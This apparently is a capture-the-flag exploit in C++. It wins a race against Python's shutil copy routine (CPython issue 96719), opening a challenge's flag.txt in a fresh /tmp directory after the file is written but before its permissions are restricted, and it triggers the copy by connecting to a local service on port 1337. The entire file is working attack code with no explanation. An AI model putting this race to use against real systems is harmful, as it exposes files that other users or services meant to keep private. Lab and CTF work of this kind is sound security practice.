#include <arpa/inet.h>
#include <dirent.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include <array>
#include <cerrno>
#include <cstdio>
#include <cstring>
#include <iostream>
#include <latch>
#include <string>
#include <string_view>
#include <thread>
#include <unordered_set>
using namespace std::literals;

std::latch started{1};
std::string flag;

// https://github.com/python/cpython/issues/96719
void racer() {
	DIR *dir = opendir("/tmp");
	if (dir == nullptr) {
		std::perror("opendir /tmp");
		started.count_down();
		return;
	}

	// save current state of direcory
	std::unordered_set<std::string> seen;
	// NOLINTNEXTLINE(concurrency-mt-unsafe): DIR* is only used by this thread
	while (struct dirent *entry = readdir(dir)) {
		if (entry->d_type == DT_DIR) {
			seen.emplace(entry->d_name);
		}
	}
	started.count_down();

	// detect temporary directory name
	std::string flag_path;
	while (flag_path.empty()) {
		rewinddir(dir);
		// NOLINTNEXTLINE(concurrency-mt-unsafe): DIR* is only used by this thread
		while (struct dirent *entry = readdir(dir)) {
			if (entry->d_type != DT_DIR) {
				continue;
			}
			std::string_view name(entry->d_name);
			if (name == "." || name == "..") {
				continue;
			}
			if (seen.emplace(name).second) {
				flag_path = "/tmp/"s + entry->d_name + "/app/flag.txt"s;
				break;
			}
		}
	}
	closedir(dir);

	// https://github.com/python/cpython/issues/96719
	// race open so that we open the flag file after it's been written by copyfile
	// but before its perms have been updated by copystat
	std::array<char, 128> buf{};
	while (true) {
		int flag_fd = open(flag_path.c_str(), O_RDONLY);
		if (flag_fd >= 0) {
			// copyfile might not have finished writing yet
			// keep reading until we get a non-empty result
			while (true) {
				ssize_t bytes = pread(flag_fd, buf.data(), buf.size(), 0);
				if (bytes > 0) {
					flag.assign(buf.data(), static_cast<size_t>(bytes));
					break;
				}
			}
			close(flag_fd);
			return;
		}
		if (errno == EACCES) {
			// copystat finished, we lost the race
			return;
		}
		// ENOENT / other: copyfile hasn't run yet, keep spinning
	}
}

int main() {
	std::jthread bg_thread(racer);

	// wait until watcher has snapshotted /tmp
	started.wait();

	int sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		std::perror("socket");
		return 1;
	}

	sockaddr_in addr{.sin_family = AF_INET, .sin_port = htons(1337)};
	inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);

	if (connect(sock, reinterpret_cast<sockaddr *>(&addr), sizeof(addr)) < 0) {
		std::perror("connect");
		return 1;
	}

	const std::string msg = "chal3\n";
	if (send(sock, msg.data(), msg.size(), 0) < 0) {
		std::perror("send");
		return 1;
	}

	bg_thread.join();
	close(sock);

	if (flag.empty()) {
		std::cout << "lost the race\n";
		return 1;
	}
	std::cout << flag << '\n';
	return 0;
}
